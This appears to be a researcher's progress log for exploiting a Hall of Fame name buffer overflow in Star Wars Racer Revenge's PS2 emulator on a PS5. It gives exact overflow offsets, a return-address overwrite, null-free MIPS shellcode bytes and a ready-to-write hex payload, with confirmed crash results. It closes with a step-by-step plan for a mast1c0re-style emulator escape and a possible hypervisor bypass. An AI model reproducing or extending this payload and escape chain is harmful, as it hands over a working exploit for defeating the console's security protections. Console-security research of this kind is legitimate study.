# Star Wars Racer Revenge PS2 Exploit Progress

## Date: 2026-01-12

## Summary
Successfully achieved **PS2 code execution** via Hall of Fame buffer overflow in Star Wars Racer Revenge (CUSA03474) running on PS5 FW 4.03. This is the first step toward a mast1c0re-style emulator escape.

---

## What Was Achieved

### 1. Buffer Overflow Discovery
- **Vulnerability**: Hall of Fame player name `strcpy` without length check
- **Trigger**: Options → Hall of Fame (overflow happens when DISPLAYING names)
- **Documentation**: PSDevWiki confirms "Stack-Smash via unchecked Record Name length"

### 2. Memory Write Primitive
- **PS5 Write Address**: `0x800061B2D6` (in P[3].bin - PS2 RAM region)
- **Method**: Kernel R/W exploit writes directly to PS2 emulator memory
- **Persistence**: Changes persist through save/reload cycle

### 3. Critical Offsets Identified
| Offset | Purpose | Notes |
|--------|---------|-------|
| 0-267 | Padding | Can contain shellcode |
| 268-271 | Data pointer | Must be valid PS2 address (no null bytes!) |
| 272-381 | Padding | - |
| **382-385** | **$ra (Return Address)** | **Controls code execution!** |

### 4. PS2 Code Execution Confirmed
- Successfully redirected $ra to shellcode at `0x803032D6`
- Shellcode executed (game freeze before crash = infinite loop running)
- **We have full control of PS2 program counter**

---

## Key Technical Details

### Working Exploit Payload Structure
```
Bytes 0-3:     [SHELLCODE START - e.g., FF FF 29 11 for infinite loop]
Bytes 4-267:   41 padding (can hold more shellcode - 264 bytes available)
Bytes 268-271: 01 01 01 01 (valid PS2 pointer - NO NULL BYTES or strcpy stops!)
Bytes 272-381: 41 padding
Bytes 382-385: D6 32 30 80 ($ra = 0x803032D6 pointing to shellcode)
Bytes 386+:    41 padding (optional)
```

### PS2 Address Calculation
- P[3].bin offset `0x003032D6` = PS2 KSEG0 address `0x803032D6`
- KSEG0 = `0x80000000 + physical_offset`
- Our shellcode at buffer start = `0x803032D6`

### Null Byte Problem (CRITICAL)
- `strcpy` stops at null bytes!
- Pointer `00 10 30 00` terminates copy at byte 271
- Must use pointers WITHOUT null bytes: `01 01 01 01` works

### Confirmed Crash Values
| Test | Offset 268 | Offset 382 | Result |
|------|-----------|------------|--------|
| Invalid pointer | 41414141 | N/A | Crash @ 0x41414141 |
| Valid ptr + invalid $ra | 01010101 | DEADBEEF | Crash @ EFBEADDE (little-endian) |
| Valid ptr + shellcode $ra | 01010101 | D6323080 | **FREEZE then crash (code exec!)** |

---

## Shellcode Examples

### Simple Infinite Loop (4 bytes, null-free)
```mips
beq $t1, $t1, -1    # Branch to self forever
```
Bytes (little-endian): `FF FF 29 11`

### Memory Write Test (24 bytes)
```mips
lui $t0, 0xDEAD       # AD DE 08 3C
ori $t0, $t0, 0xBEEF  # EF BE 08 35
lui $t1, 0x8030       # 30 80 09 3C
ori $t1, $t1, 0x3232  # 32 32 29 35
sw $t0, 0x4141($t1)   # 41 41 28 AD  (writes DEADBEEF to 0x80307373)
beq $t1, $t1, -1      # FF FF 29 11  (infinite loop)
```

---

## Next Steps (Tomorrow)

### 1. Find Emulator Memory Layout
The mast1c0re escape requires finding these addresses in the Star Wars Racer emulator:
- **N status buffer** (was 0x897810 in Okage)
- **S status buffer** (was 0x897820 in Okage)
- **IOP RAM pointer** (was 0xAF6E38 in Okage)

**Action**: Dump the PS2 emulator's memory map:
- Look for regions with "eboot", "emu", "ps2" in name
- Find executable and data sections
- PS5 layout differs from PS4 - need to discover actual addresses

### 2. Dump Emulator Sections
Once we find where eboot is mapped:
- Dump .text section for ROP gadgets
- Dump .data section for buffer/pointer locations
- Analyze to find Star Wars Racer-specific offsets

### 3. Implement Emulator Escape
Following mast1c0re technique:
1. Overflow S status buffer to corrupt N status index
2. Use OOB write to corrupt IOP RAM pointer
3. Redirect IOP RAM from `0x9000000000` to eboot data area
4. PS2 writes now affect native x86-64 memory
5. Corrupt function pointers in eboot
6. Trigger ROP chain for native code execution

### 4. Chain to HV Bypass
- Native code in PS4 compat layer may have different attack surface
- Investigate if PS4 compat syscalls have weaker security
- Potential path to HV bypass without GMET/CFI restrictions

---

## Mast1c0re Research Summary

### Key Sources
- CTurt's writeup: https://cturt.github.io/mast1c0re.html
- McCaulay's implementation: https://github.com/McCaulay/mast1c0re
- Works on PS5 FW 1.00-7.61 for PS2 backups

### Emulator Architecture
- Two processes: main app (eboot.bin) + compiler (ps2-emu-compiler.self)
- JIT compilation for PS2→x86-64
- 65MB JIT budget limit (Sony's mitigation)

### Native eboot Layout (Okage reference)
- Executable: `0x400000`
- Read-only: `0x750000`
- Read-write: `0x768000`
- **These addresses differ on PS5!**

### The IOP RAM Pointer Trick
```c
// Emulator code when PS2 writes to IOP RAM:
*(unsigned int *)(iopram + (ulong)address) = value;

// iopram pointer at 0xAF6E38, normally = 0x9000000000
// If corrupted to 0x4100000000, PS2 writes go to native eboot memory!
```

---

## Files & Locations

### On PS5
- Save location: `/user/home/*/savedata/CUSA03474/`
- Memory region: P[3].bin at `0x8000318000` (PS2 RAM)
- Write target: `0x800061B2D6` (Hall of Fame name)

### Game Info
- Title: Star Wars Racer Revenge
- Package ID: CUSA03474
- PS2 Serial: SLUS-20268
- Physical disc required

---

## Hardware Setup
- PS5 on FW 4.03 (kernel exploit working)
- PS5 Pro on FW 11.40 (backup system)
- Star Wars Racer Revenge physical disc
- ps5debug + ps4reaper on Windows for memory access

---

## Commands for Tomorrow

### Start Fresh Session
1. Load this file for context
2. Start Star Wars Racer Revenge
3. Navigate to Hall of Fame (don't trigger yet)
4. Dump memory map - focus on finding eboot sections
5. Look for low addresses or search for "eboot"/"emu"/"ps2"

### Quick Exploit Test (if needed)
Write this hex to `0x800061B2D6`:
```
FF FF 29 11 41 41 41 41 41 41 41 41 41 41 41 41
[... 41 padding until offset 268 ...]
01 01 01 01 [offset 268-271: valid pointer]
[... 41 padding until offset 382 ...]
D6 32 30 80 [offset 382-385: $ra to shellcode]
```
Result: Game should freeze (PS2 code execution confirmed)
